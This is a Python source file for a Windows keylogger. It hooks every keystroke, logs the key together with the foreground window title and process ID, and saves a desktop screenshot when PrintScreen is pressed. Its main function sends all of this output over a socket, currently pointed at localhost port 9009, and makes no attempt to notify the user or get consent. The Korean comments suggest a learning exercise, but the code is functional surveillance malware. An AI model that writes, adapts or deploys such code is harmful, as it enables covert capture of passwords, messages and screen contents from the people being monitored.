from ctypes import *
# from winappdbg import Debug, HexDump, Win32
import ctypes
import ctypes.wintypes
import array
import sys

import win32gui
import pythoncom, pyHook
import win32clipboard
import win32ui
import win32con
import win32api
from socket import *

class MySocket(socket):
    def __init__(self, *args):
        socket.__init__(self, *args)

    def write(self, text):
        return self.send(str.encode(text))


curWindow = None

def getCurWinTitle():
    global curWindow
    try:
        hwnd = win32gui.GetForegroundWindow()
        winTitle = win32gui.GetWindowText(hwnd)
        if winTitle != curWindow:
            curWindow = winTitle
            print('\n[%s]' %winTitle)
    except:
        print('\n[Unknown Window]')
        pass

def getCurProcess():
    pid = ctypes.wintypes.DWORD()
    hwnd = ctypes.windll.user32.GetForegroundWindow() # 가장 위에 떠있는 윈도우의 핸들 가져오기
    
    #pid = c_ulong(0)
    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid)) # 그를 이용해 processID 가져오기

    processId = "%d" % pid.value 
    print('++ PID:', processId, '\n')


def getScreenshot() :
    hwnd = win32gui.GetDesktopWindow()
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    height = bottom - top
    width = right - left

    hDC = win32gui.GetWindowDC(hwnd) # DC for Windows
    pDC = win32ui.CreateDCFromHandle(hDC) # DC for pywin32
    memDC = pDC.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(pDC, width, height)
    memDC.SelectObject(screenshot)

    memDC.BitBlt((0,0), (width, height), pDC, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(memDC, 'C:\screen\screenshot2.bmp')

    memDC.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def OnKeyboardEvent(event) :
    getCurWinTitle()
    data = '++ Key: %s'%(event.Key)
    data += '   KeyID(ASCII): %s'%(event.KeyID)
    print(data)
    getCurProcess()
    if event.Key == "Snapshot":
        getScreenshot()
    
    #process = event.get_process() 여기부터
    #name = process.get_filename()
    #print ("Process: %s") % name 20180309 주석처리
    return True

def main():
    with MySocket() as sock:
        HOST = 'localhost'
        PORT = 9009
        sock.connect((HOST, PORT))
        sys.stdout = sock
        hm=pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()

if __name__ == '__main__':
    main()
